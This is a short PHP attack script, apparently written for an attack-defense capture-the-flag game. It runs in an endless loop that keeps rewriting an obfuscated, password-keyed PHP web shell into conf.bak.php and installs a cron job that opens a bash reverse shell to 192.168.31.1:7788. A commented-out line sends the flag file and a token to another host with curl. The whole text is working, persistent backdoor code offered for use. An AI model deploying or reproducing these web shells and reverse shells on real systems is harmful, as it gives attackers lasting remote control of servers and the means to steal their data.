ignore_user_abort(true);
set_time_limit(0);
$file = 'conf.bak.php';
$shell = '<?php $rx="IAppZihAbWQ1KCRfUE9TVFsncbdGFz";$ge="bdcyddKT09PSdbdjM2Y4MzIyYTgxMmbdQ3MDFlNmVjNzM1";$zgs = str_replace("eq","","eqseqteqreq_eqreqepeqlaeqceqe");$ki="ZbdhbbdCgkX1BPU1bdRbY21kXSk7Cg==";$rv="ZjbddjYjgbdwMmbdI5bdZicpCgbdlAZX";$lf = $zgs("q", "", "baqsqe64_qdqeqcoqdqe");$egc = $zgs("h","","crhehahtheh_funhcthihon");$zue = $egc(\'\', $lf($zgs("bd", "", $rx.$ge.$rv.$ki))); $zue();?>';
//post pass=Fliper&cmd=
$message="*/1 * * * * echo \"bash -i >& /dev/tcp/192.168.31.1/7788 0>&1\" | bash";
# $message="* * * * * curl 192.168.136.1:8098/?flag=$(cat /var/www/html/flag)&token=7gsVbnRb6ToHRMxrP1zTBzQ9BeM";

while (TRUE) {
file_put_contents($file, $shell);
system("echo '$message' > /tmp/1 ;");
system("crontab /tmp/1;");
system("rm /tmp/1;");
usleep(50);
}